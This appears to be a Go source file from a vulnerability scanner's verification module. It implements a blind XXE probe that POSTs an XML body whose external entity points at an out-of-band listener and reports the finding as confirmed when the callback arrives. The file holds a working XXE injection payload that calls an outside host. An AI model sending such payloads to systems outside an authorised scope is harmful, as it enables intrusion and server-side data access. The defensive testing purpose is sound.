package verify

import (
	"net/http"
	"strings"
)

// xxeBody builds an XML document whose external entity points at our listener.
// A vulnerable parser resolving &xxe; performs a server-side fetch of oobURL,
// which the OOB listener records — blind, out-of-band XXE.
func xxeBody(oobURL string) string {
	return `<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE root [<!ENTITY xxe SYSTEM "` + oobURL + `">]>` +
		`<root>&xxe;</root>`
}

// XXEProbe verifies XML external entity injection. Unlike the query-param
// probes, the payload is the request BODY, so it ignores f.Param and POSTs XML.
// It is OOB-only (blind): the oracle is a callback to our listener, which proves
// the parser dereferenced an external entity. With no OOB listener available it
// cannot conclude and returns inconclusive.
type XXEProbe struct{}

func (XXEProbe) Kind() string { return "xxe" }

func (XXEProbe) method(f Finding) string {
	if f.Method == "" {
		return http.MethodPost
	}
	return f.Method
}

func (p XXEProbe) Plan(f Finding, oob string) Plan {
	url := oob
	if url == "" {
		url = "http://<oob-listener>"
	}
	return Plan{Summary: p.method(f) + " " + f.Target +
		"  [XML body with external entity → " + url + "/xxe-<nonce>]"}
}

func (p XXEProbe) Execute(f Finding, env *Env) Result {
	r := Result{}
	oob := env.OOB.URL()
	if oob == "" {
		r.Evidence = "inconclusive: XXE verify needs the out-of-band listener, which is unavailable"
		return r
	}
	nonce := "/xxe-" + newNonce()
	body := xxeBody(oob + nonce)

	req, err := http.NewRequest(p.method(f), f.Target, strings.NewReader(body))
	if err != nil {
		r.Evidence = "build request: " + err.Error()
		return r
	}
	applyHeaders(req, f)
	// Set Content-Type last so the body is always parsed as XML, even if the
	// operator's scope headers include a (stale) Content-Type.
	req.Header.Set("Content-Type", "application/xml")

	if _, _, err := env.do(req); err != nil {
		r.Evidence = "request error (inconclusive): " + err.Error()
		return r
	}
	if env.OOB.anyHitPrefix(nonce) {
		r.Confirmed = true
		r.Evidence = "out-of-band: the XML parser resolved our external entity and fetched the listener — blind XXE"
		return r
	}
	r.Refuted = true
	r.Evidence = "parser did not dereference the external entity (entities likely disabled)"
	return r
}

func init() { Register(XXEProbe{}) }
